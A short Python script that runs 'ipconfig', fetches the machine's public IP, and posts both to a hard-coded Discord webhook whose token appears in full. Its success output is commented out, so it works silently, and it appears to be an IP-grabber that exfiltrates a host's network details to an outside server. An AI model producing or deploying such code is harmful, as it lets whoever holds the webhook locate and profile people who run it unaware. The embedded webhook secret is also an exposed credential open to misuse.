from subprocess import run
import requests
from dotenv import load_dotenv
import os

# Discord webhook URL (replace with your actual webhook URL)
WEBHOOK_URL = "https://discord.com/api/webhooks/1337920702132781147/wgLXRI50SrUnWattsHhSNN4rNhy9lAYbdFWmtxYMpup1Sy4ltZChSpfxqoBre7onR3sv"

CMD = ['ipconfig']

def send_to_discord(content):

    data = {
        "content": content
    }
    response = requests.post(WEBHOOK_URL, json=data)
    """
    if response.status_code == 204:
        print("Message sent successfully.")
    else:
        print(f"Failed to send message: {response.status_code}")
    """
def run_cmd_and_send():
    try:
        result = run(CMD, capture_output=True, text=True)
        output = result.stdout
        # Truncate output if it exceeds Discord message limit (2000 characters)
        if len(output) > 2000:
            output = output[:1997] + '...'
        send_to_discord(f"```Your local ips are: \n{output}\n```")
    except Exception as e:
        send_to_discord(f"Error: {str(e)}")

def get_public_ip():
    try:
        response = requests.get('https://api64.ipify.org?format=json')
        response.raise_for_status()
        ip_address = response.json().get('ip')
        send_to_discord(f"```\nYour public ip is: {ip_address}\n```")
    except requests.exceptions.RequestException as e:
        print(f"Error fetching public IP: {e}")
        return None


if __name__ == "__main__":
    run_cmd_and_send()
    get_public_ip()
